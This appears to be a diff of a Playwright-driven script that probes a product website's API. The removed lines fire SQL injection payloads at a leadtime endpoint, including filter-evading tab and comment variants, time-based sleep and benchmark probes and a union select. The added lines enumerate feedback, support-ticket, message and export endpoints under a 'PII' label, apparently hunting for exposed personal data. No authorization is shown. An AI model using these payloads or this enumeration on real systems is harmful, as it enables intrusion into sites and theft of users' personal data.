@@ -11,23 +11,26 @@ with sync_playwright() as p:
     print('ready',flush=True)
     res=page.evaluate("""async () => {
       const out={};
-      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>120?t.slice(0,120):t);}catch(e){out[n]='ERR '+String(e).slice(0,50);}};
-      const P='/api/v1/product/leadtime/';
-      await get('base','/api/v1/product/leadtime/9376?num=1');
-      await get('hash','/api/v1/product/leadtime/9376%23?num=1');
-      await get('sq_hash','/api/v1/product/leadtime/9376%27%23?num=1');
-      await get('hex','/api/v1/product/leadtime/0x39333736?num=1');
-      await get('plus','/api/v1/product/leadtime/9376+0?num=1');
-      await get('or_tab','/api/v1/product/leadtime/0%09or%091=1%23?num=1');
-      await get('or_cmt','/api/v1/product/leadtime/0/**/or/**/1=1%23?num=1');
-      await get('or_pipe','/api/v1/product/leadtime/0%7c%7c1=1%23?num=1');
-      await get('and_tab','/api/v1/product/leadtime/9376%09and%091=2%23?num=1');
-      await get('sleep_tab','/api/v1/product/leadtime/0%09or%09sleep(3)%23?num=1');
-      await get('sleep_cmt','/api/v1/product/leadtime/0/**/or/**/sleep(3)%23?num=1');
-      await get('bench','/api/v1/product/leadtime/0%09or%09benchmark(3000000,md5(1))%23?num=1');
-      await get('union_cmt','/api/v1/product/leadtime/0/**/union/**/select/**/1,2,3%23?num=1');
+      const req=async(n,method,u,body)=>{try{const opt={method,headers:{'lang':'zh-CN'}};if(body){opt.headers['Content-Type']='application/json';opt.body=JSON.stringify(body);}const r=await fetch(u,opt);const ct=r.headers.get('content-type')||'';const t=await r.text();out[n]=r.status+'|'+ct.slice(0,20)+'|'+(t.length>200?t.slice(0,200):t);}catch(e){out[n]='ERR '+String(e).slice(0,60);}};
+      await req('fb_list','GET','/api/v1/feedback');
+      await req('fb_list_p1','GET','/api/v1/feedback?page=1');
+      await req('fb_list_p1s','GET','/api/v1/feedback?page=1&pageSize=10');
+      await req('fb_hist','GET','/api/v1/feedback?page=1&limit=20');
+      await req('cmp_export','GET','/api/v1/compare/exportToExcel');
+      await req('cmp_export_ids','GET','/api/v1/compare/exportToExcel?ids=131');
+      await req('cmp_export_ids2','GET','/api/v1/compare/exportToExcel?listIds=131');
+      await req('cmp_get','GET','/api/v1/compare');
+      await req('cmp_get_ids','GET','/api/v1/compare?ids=131');
+      await req('cmp_get_list','GET','/api/v1/compare?listIds=131');
+      await req('cmp_show_list','GET','/api/v1/compare/show?listIds=131');
+      await req('curves','GET','/api/v1/product/curves/9376');
+      await req('dlcurve','GET','/api/v1/product/downloadCurve?productId=9376');
+      await req('filt','GET','/api/v1/category/filterSameProducts/131');
+      await req('cs_tickets','GET','/api/v1/cs/tickets');
+      await req('cs_msg','GET','/api/v1/cs/messages');
+      await req('acc_1','GET','/api/v1/acceptance/1');
       return out;
     }""")
-    print('===== SQLI2 =====',flush=True)
-    for k,v in res.items(): print('%-12s %s'%(k,v),flush=True)
+    print('===== PII =====',flush=True)
+    for k,v in res.items(): print('%-16s %s'%(k,v),flush=True)
     b.close()
